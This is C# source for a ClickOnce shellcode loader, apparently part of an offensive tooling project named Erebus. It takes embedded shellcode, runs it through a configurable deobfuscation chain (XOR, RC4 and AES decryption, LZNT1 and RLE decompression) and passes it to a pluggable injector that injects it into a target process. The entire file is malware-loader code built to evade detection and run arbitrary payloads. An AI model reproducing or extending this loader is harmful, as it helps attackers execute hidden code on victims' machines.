using Erebus.ClickOnce;
using System.Runtime.Versioning;

namespace ShellcodeLoader
{
    public class ClickOnceLoader
    {
        [STAThread]
        [SupportedOSPlatform("windows")]
        public static void Main(string[] args)
        {
            // Load configuration
            string injectionMethod = InjectionConfig.InjectionMethod;
            int targetPid = InjectionConfig.TargetPID;
            byte[] shellcode = InjectionConfig.Shellcode;

            DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
            if (targetPid > 0)
                DebugLogger.WriteLine($"[*] Target PID: {targetPid}");

            // Get encrypted shellcode
            // byte[] shellcode = ErebusRsrc.erebus_bin;
            DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");

            // ============================================================
            // DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
            // ============================================================

            // STEP 1: DECODE (String-based encoding via config)
            DebugLogger.WriteLine("\n[*] STEP 1: Decoding shellcode based on configuration...");
            if (InjectionConfig.EncodingType > 0)
            {
                DebugLogger.WriteLine($"[*] Configured encoding type: {InjectionConfig.EncodingType}");
                // Decoding logic would be applied if shellcode is string-encoded
                // For now, assuming shellcode is already in byte array form
            }
            else
            {
                DebugLogger.WriteLine("[*] No encoding configured (EncodingType = 0), skipping decoding");
            }

            // STEP 2: DECRYPT (Encryption via config)
            DebugLogger.WriteLine("[*] STEP 2: Decrypting shellcode based on configuration...");
            switch (InjectionConfig.EncryptionType)
            {
                case 1:
                    DebugLogger.WriteLine("[+] Applying XOR decryption...");
                    shellcode = DecryptionUtils.DecryptXOR(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 2:
                    DebugLogger.WriteLine("[+] Applying RC4 decryption...");
                    shellcode = DecryptionUtils.DecryptRC4(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 3:
                    DebugLogger.WriteLine("[+] Applying AES-ECB decryption...");
                    shellcode = DecryptionUtils.DecryptAES_ECB(shellcode, InjectionConfig.EncryptionKey);
                    break;

                case 4:
                    DebugLogger.WriteLine("[+] Applying AES-CBC decryption...");
                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey);
                    break;

                default:
                    DebugLogger.WriteLine("[*] No encryption configured (EncryptionType = 0), skipping decryption");
                    break;
            }

            // STEP 3: DECOMPRESS (Binary compression via config)
            DebugLogger.WriteLine("[*] STEP 3: Decompressing shellcode based on configuration...");
            switch (InjectionConfig.CompressionType)
            {
                case 1:
                    DebugLogger.WriteLine("[+] Applying LZNT1 decompression...");
                    shellcode = CompressionDecodingUtils.DecompressLZNT1(shellcode);
                    break;

                case 2:
                    DebugLogger.WriteLine("[+] Applying RLE decompression...");
                    shellcode = CompressionDecodingUtils.DecompressRLE(shellcode);
                    break;

                default:
                    DebugLogger.WriteLine("[*] No compression configured (CompressionType = 0), skipping decompression");
                    break;
            }
            DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");

            // Final entropy check
            // int finalEntropy = DecryptionUtils.CalculateEntropyScore(shellcode);
            // DebugLogger.WriteLine($"[*] Final entropy score: {finalEntropy}/100");

            // Execute injection
            try
            {
                IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
                DebugLogger.WriteLine($"\n[+] Using: {injector.Name}");
                DebugLogger.WriteLine($"[+] Description: {injector.Description}");
                DebugLogger.WriteLine("");

                bool success = injector.Inject(shellcode, targetPid);

                if (success)
                {
                    DebugLogger.WriteLine("\n[+] Injection completed successfully!");
                }
                else
                {
                    DebugLogger.WriteLine("\n[-] Injection failed!");
                    Environment.Exit(1);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
                Environment.Exit(1);
            }
        }
    }
}
